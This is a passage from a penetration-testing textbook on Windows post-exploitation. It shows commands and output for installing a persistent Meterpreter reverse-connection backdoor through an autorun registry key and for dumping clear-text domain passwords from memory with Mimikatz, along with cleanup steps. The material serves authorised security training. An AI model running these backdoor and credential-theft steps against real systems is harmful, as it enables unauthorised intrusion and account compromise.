the company database, and maybe even print out working badges, assuming they have
that level of access. This scenario is similar to post-exploitation on a pentest—which is
exactly what we’re going to discuss in this chapter, starting with Windows systems.
 Windows systems are extremely common in enterprise networks due to their popu-
larity among IT professionals and system administrators. In this chapter, you’ll learn
all about post-exploitation on Windows systems, what to do after you’ve compromised
a vulnerable target, and how you can use the access you’ve obtained to further elevate
your access on the network and eventually take control of the entire network.
8.1
Fundamental post-exploitation objectives
Post-exploitation takes place after compromise. You’ve managed to penetrate a target sys-
tem by using a discovered vulnerable attack vector, so what do you do now? Depending
on how specific you want to get, the answer can vary significantly based on your engage-
ment’s scope. But there are a few fundamental objectives that you’ll want to accomplish
during most engagements. I’m of the opinion that any post-exploitation activity falls
under the umbrella of one of three high-level categories illustrated in figure 8.1:
 Maintaining reliable re-entry
 Harvesting credentials
 Moving laterally 
C. Repeat password guessing
    using discovered credentials
    to unlock access to level-2
    targets.
B. Locate clear-text and hashed
    credentials from all level-1
    targets.
A. Establish a persistent meterpreter 
    that automatically connects 
    back if the session dies.
Level 2: Newly accessible targets
Move laterally
Use credentials to access
new targets
Harvest clear-text credentials
Harvest domain cached
credentials
Harvest local account password
hashes
Install persistent back-door
executable
Harvest credentials
Maintain reliable re-entry
Level 1: Compromised targets
Figure 8.1
Post-exploitation workflow
137
Fundamental post-exploitation objectives
8.1.1
Maintaining reliable re-entry
Presumably, the access you have obtained to your target system is through a command
shell: either fully interactive, like the Meterpreter or Windows command prompt, or
non-interactive, such as a web shell or database console that can run individual OS
commands.
 From an attacker’s perspective—and you must always remember that as a pen-
tester, your job is to play the role of an attacker—you want the assurance that the level
of access you’ve worked hard to obtain is not easily taken from you. For example, if
the service you exploited crashes or restarts, it’s possible you could lose your network
connection to the Meterpreter or command shell and be unable to get it back up. Ide-
ally, you’ll want a reliable way to re-enter the system if you are booted from it. In sec-
tion 8.2.1, you’ll learn to set up a persistent Meterpreter session that automatically
connects back to your attacking machine if the session dies or the compromised target
is rebooted.
8.1.2
Harvesting credentials
It is well known throughout the pentesting industry that if you can gain access to a sin-
gle system, you can then gain access to other systems on that network by using creden-
tials obtained from the initial system and finding other accessible hosts that share the
same username and password. Three commonly targeted sets of credentials that we
discuss in this chapter are as follows:
 Local user account password hashes
 Domain cached credentials
 Clear-text configuration files with database credentials
8.1.3
Moving laterally
Moving laterally, sometimes also referred to as pivoting, is the concept of going directly
from one compromised host to another host that was not previously accessible. You
first had to obtain something, usually a set of credentials from the first host, before you
could pivot to the next. Once again, I like to use the term level-two when describing
these hosts that become accessible only after you’ve compromised a level-one target.
There is a good reason for this distinction. In chapter 12, you will learn about writing
attack narratives that describe how you were able to move from A to Z throughout your
client’s network. I’ve found that regardless of whether you divide hosts into levels in
your final report, clients often draw the distinction between systems that you were able
to compromise directly because there was something wrong, such as a patch missing,
and systems you could access only because another host was vulnerable. 
 Clients make this distinction because they are thinking about the remediation
efforts required to fix all the issues you brought up in your pentest report. If you were
able to access 5,000 computer systems, for example, but only after obtaining creden-
tials from a few that had vulnerabilities, the client might argue that if they had fixed
138
CHAPTER 8
Windows post-exploitation
the few level-one systems, you wouldn’t have been able to access the 5,000 level-two sys-
tems. This is problematic because even if you secure the initial level-one systems that
were discovered during an INPT, there is no guarantee that there aren’t additional
level-one systems the pentest didn’t find. There is also no guarantee that a new level-
one system with a default password won’t be deployed to the network tomorrow or
next week or next month. Be patient when explaining this to clients because it will
likely come up often, at least if you follow the career path of a professional penetra-
tion tester (a consultant).
8.2
Maintaining reliable re-entry with Meterpreter
Suppose for a second that the Meterpreter shell you have access to was gained by
exploiting a vulnerability that presented itself only one time—for example, a user on
your target system happened to be using a vulnerable application that you identified
and exploited. Then the system rebooted, and you lost your Meterpreter shell. When
the system came back up, the user was done with the vulnerable application, and you
no longer had an avenue of attack. I can assure you from personal experience this is
every bit as frustrating as it sounds.
 Or, if it’s easier to picture, imagine that our movie heist crew gained access to a
restricted area after finding an employee keycard lying around. They used the keycard
to enter the restricted area briefly and then left (let’s say they heard a noise), intend-
ing to return in a few hours. Unfortunately, when they came back, the keycard had
been deactivated because the employee reported it lost. Maintaining reliable re-entry
is all about making sure you can freely come and go as you please once you have estab-
lished access to a compromised level-one target.
 This is why one of the first objectives you should focus on during post-exploitation
is maintaining persistent re-entry into compromised targets. You may have a shell now,
but there is no telling how long it will last, so you should be concerned with securing
your ability to get back into your compromised target at will. Metasploit comes with a
handy persistence script that can be used to facilitate this objective effectively.
 There are multiple ways of thinking about persistent re-entry, and I’m going to
demonstrate the most straightforward but not necessarily the stealthiest approach.
(That’s OK because we are performing a network pentest, not a red team exercise.)
With this method, you install an executable binary Meterpreter backdoor on the com-
promised host that will autorun each time the system boots. You can achieve this with
the run persistence command and the command arguments listed in table 8.1.
Table 8.1
Persistent Meterpreter command arguments
Command argument
Purpose
-A
Automatically starts a Metasploit listener on your attacking machine
-L c:\\
Writes the payload to the root of c:\ (two \\ for Ruby’s sake)
-X
Installs the payload to an autorun registry key, which runs at boot
139
Maintaining reliable re-entry with Meterpreter
8.2.1
Installing a Meterpreter autorun backdoor executable
Set up your Meterpreter autorun backdoor executable from the Meterpreter prompt
of a comprised Windows target by running the following command: 
meterpreter > run persistence -A -L c:\\ -X -i 30 -p 8443 -r 10.0.10.160
You can see from the output shown in listing 8.1 that Metasploit created a randomly
generated file called VyTsDWgmg.vbs, which contains VBScript to launch your Meter-
preter payload, and placed it in the root of the C drive as you told it to. Additionally,
you can see that a new Meterpreter session has been opened for you.
[*] Running Persistence Script
[*] Resource file for cleanup created at
.msf4/logs/persistence/TIEN_20191128.3107/TIEN_20191128.3107.rc    
[*] Payload=windows/meterpreter/reverse_tcp LHOST=10.0.10.160 LPORT=8443
[*] Persistent agent script is 99602 bytes long
[+] Persistent Script written to c:\VyTsDWgmg.vbs
[*] Starting connection handler at port 8443
[+] exploit/multi/handler started!
[*] Executing script c:\VyTsDWgmg.vbs
[+] Agent executed with PID 260
[*] Installing into autorun as
HKLM\Software\Microsoft\Windows\CurrentVersion\Run\jDPSuELsEhY
[+] Installed into autorun as
HKLM\Software\Microsoft\Windows\CurrentVersion\Run\jDPSuELsEhY
meterpreter > [*] Meterpreter session 2 opened (10.0.10.160:8443 ->
10.0.10.208:50764) at 2019-11-28 08:31:08 -0600    
meterpreter >
Now that the Meterpreter autorun backdoor executable is installed and configured to
autorun at boot time, your attacking machine will receive a connection from a new
Meterpreter session every time the backdoored system reboots. I would never reboot a
server on a client’s production network without their explicit consent, but for the sake
of illustration, I’ll show you what happens when I manually reboot this target host. As
you can see from the output in listing 8.2, a few moments after I issue the reboot com-
mand, which results in a stale Meterpreter session, the system comes back online. I
now have a new Meterpreter session, which was executed via the autorun backdoor
executable.
-i 30
Tells the payload to attempt a connection every 30 seconds
-p 8443
Tells the payload to attempt connections on port 8443
-r 10.0.10.160
Tells the payload what IP address to attempt to connect to
Listing 8.1
Installing the Meterpreter autorun backdoor executable
Table 8.1
Persistent Meterpreter command arguments (continued)
Command argument
Purpose
An extremely important cleanup file
New Meterpreter session that
opened automatically for you
140
CHAPTER 8
Windows post-exploitation
meterpreter > reboot
Rebooting...
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(windows/smb/ms17_010_psexec) > [*] Meterpreter session 3
opened (10.0.10.160:8443 -> 10.0.10.208)at 2019-11-28 08:39:29-0600    
msf5 exploit(windows/smb/ms17_010_psexec) > sessions -i 3
[*] Starting interaction with 3...
meterpreter > dir c:\\
Listing: c:\
============
Mode                 Size               Type  Last modified                  
Name
----                 ----               ----  -------------                  
----
40777/rwxrwxrwx      4096               dir   2009-07-13 22:18:56 -0500      
$Recycle.Bin
40777/rwxrwxrwx      0                  dir   2009-07-14 00:08:56 -0500      
Documents and Settings
40777/rwxrwxrwx      0                  dir   2019-05-06 13:37:51 -0500      
Domain Share
40777/rwxrwxrwx      0                  dir   2009-07-13 22:20:08 -0500      
PerfLogs
40555/r-xr-xr-x      4096               dir   2009-07-13 22:20:08 -0500      
Program Files
40555/r-xr-xr-x      4096               dir   2009-07-13 22:20:08 -0500      
Program Files (x86)
40777/rwxrwxrwx      4096               dir   2009-07-13 22:20:08 -0500      
ProgramData
40777/rwxrwxrwx      0                  dir   2019-05-06 14:26:17 -0500      
Recovery
40777/rwxrwxrwx      12288              dir   2019-05-06 15:05:31 -0500      
System Volume Information
40555/r-xr-xr-x      4096               dir   2009-07-13 22:20:08 -0500      
Users
40777/rwxrwxrwx      16384              dir   2009-07-13 22:20:08 -0500      
Windows
100666/rw-rw-rw-     99709              fil   2019-11-28 08:35:31 -0600      
VyTsDWgmg.vbs         
Listing 8.2
Reestablishing Meterpreter access automatically after system reboot
A new Meterpreter session opens
automatically after the system reboots.
VBScript file containing the Meterpreter backdoor
Cleaning up using Metasploit .rc files
As always, anytime you write a file to a system on your client’s network, you need to
take detailed notes so you can clean up after yourself. You don’t want your client’s
computers arbitrarily calling out to random IP addresses after your pentest is over
and you’ve left. The importance of keeping detailed records of all file drops cannot
be overstated.
141
Harvesting credentials with Mimikatz
8.3
Harvesting credentials with Mimikatz
If you haven’t noticed already, hackers and pentesters like to pick on Microsoft Win-
dows systems. It’s nothing personal; there just seem to be more inherent security flaws
in the OS’s design. Unless your client’s Windows system administrators have taken
proper precautions, you can probably obtain clear-text passwords directly from the vir-
tual memory space of a compromised Windows target.
 This is possible, again, because of another flaw in the design of the Windows OS.
This one is a bit more complex. The short version is that a process called the Local
Security Authority Subsystem Service (LSASS) runs on Windows systems and by design
requires the ability to retrieve an active user’s clear-text password. When a user logs in
to a Windows system, a function in the lsass.exe process stores their clear-text pass-
word in memory. 
 A wise sorcerer named Benjamin Delpy researched this design flaw extensively and
created a powerful framework called Mimikatz that can be used to extract clear-text
passwords directly from the virtual memory space of a compromised Windows target.
Mimikatz was initially a standalone binary application; but as you can imagine, due to
its incredible usefulness, it has been adopted into dozens of pentesting tools.
Metasploit and CME are no exception. 
NOTE
If you want to learn all about the inner technical workings of Mimikatz,
how it works, and what it does, I suggest you start with Benjamin’s blog http://
blog.gentilkiwi.com/mimikatz (which is written in French, by the way). 
8.3.1
Using the Meterpreter extension
The Mimikatz extension can be loaded into any active Meterpreter session by typing
the command load mimikatz at the Meterpreter prompt. Once the extension is
loaded, you can type help mimikatz to see which commands are available.
The cleanup file created for you earlier contains all the necessary commands to
restore the compromised target to its original state. The file TIEN_20191128.
3107.rc is what Metasploit calls a resource file and can be run with the command
resource file.rc. 
Before running the file blindly, let’s take a look at what it’s doing. I’ll first change into
the ./msf4/logs/persistence/TIEN_20191128/ directory and then examine the con-
tents of the file. It contains only two commands: the first deletes the VBScript exe-
cutable, and the second deletes the registry key created to autorun the script. Be
sure you do this before the engagement is over:
rm c://VyTsDWgmg.vbs
reg deleteval -k 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' 
➥ -v jDPSuELsEhY
142
CHAPTER 8
Windows post-exploitation
Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7
(6.1 Build 7601, Service Pack 1).). Did you mean to 'load kiwi' instead?
Success.
meterpreter > help mimikatz
Mimikatz Commands
=================
    Command           Description
    -------           -----------
    kerberos          Attempt to retrieve kerberos creds.
    livessp           Attempt to retrieve livessp creds.
    mimikatz_command  Run a custom command.
    msv               Attempt to retrieve msv creds (hashes).
    ssp               Attempt to retrieve ssp creds.
    tspkg             Attempt to retrieve tspkg creds.    
    wdigest           Attempt to retrieve wdigest creds. 
meterpreter >
Most of these commands attempt to retrieve clear-text credentials from memory using
various methods. The mimikatz_command option can be used to interface directly with
the Mimikatz binary. I find that the tspkg and wdigest commands are all I need most
of the time. Of course, that’s just what works for me; it doesn’t hurt to try the other
options. Run the following command:
meterpreter > tspkg 
 [+] Running as SYSTEM
[*] Retrieving tspkg credentials
tspkg credentials
=================
AuthID      Package    Domain        User           Password
------      -------    ------        ----           --------
0;997       Negotiate  NT AUTHORITY  LOCAL SERVICE  
0;44757     NTLM                                    
0;999       Negotiate  CAPSULECORP   TIEN$          
0;17377014  Kerberos   CAPSULECORP   tien           Password82$    
0;17376988  Kerberos   CAPSULECORP   tien           Password82$
0;996       Negotiate  CAPSULECORP   TIEN$          n.s. (SuppCred KO) / 
meterpreter >
This technique requires an active user to have recently logged in to the compromised
system so their credentials are stored in memory. This won’t do you any good if you
Listing 8.3
Loading the Mimikatz Meterpreter extension
Listing 8.4
Retrieving tspkg credentials with Mimikatz
Options that I 
use most often
Clear-text credentials extracted for
the domain user CAPSULECORP\tien
143
Harvesting domain cached credentials
are on a system that doesn’t have any active or recent user sessions. If running the